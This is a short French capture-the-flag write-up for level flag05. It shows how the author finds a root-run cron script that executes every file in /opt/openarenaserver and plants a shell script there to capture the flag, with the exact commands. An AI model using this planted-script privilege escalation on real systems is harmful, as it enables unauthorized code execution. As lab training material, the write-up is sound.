1. ls -la -> rien
2. Check fichiers liés à flag05 : find / -type f -user flag05 2>/dev/null -> trouve /usr/sbin/openarenaserver
3. cat /usr/sbin/openarenaserver -> script shell qui exec tous les fichiers dans /opt/openarenaserver

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

4. On peut direct créer un fichier dans /opt/openarenaserver/ qui exécute getflag et redirige l'output vers /tmp/ :
- echo "getflag > /tmp/flag05" > /opt/openarenaserver/getflag.sh
- chmod +x /opt/openarenaserver/getflag.sh
5. ./openarenaserver -> permission denied, check les droits pour comprendre comment lancer le script
6. Après qlq minutes, j'essaie de modif getflag.sh -> le script a disparu (et donc) : il a été lancé automatiquement = cron
7. crontab -l -> rien, cat /etc/crontab -> rien, grep -r "openarenaserver" /etc/ 2>/dev/null -> rien, grep -r "openarenaserver" / 2>/dev/null -> rien non plus
8. Je savais toujours pas d'où vient le cron, mais j'avais le flag dans /tmp/flag05 :p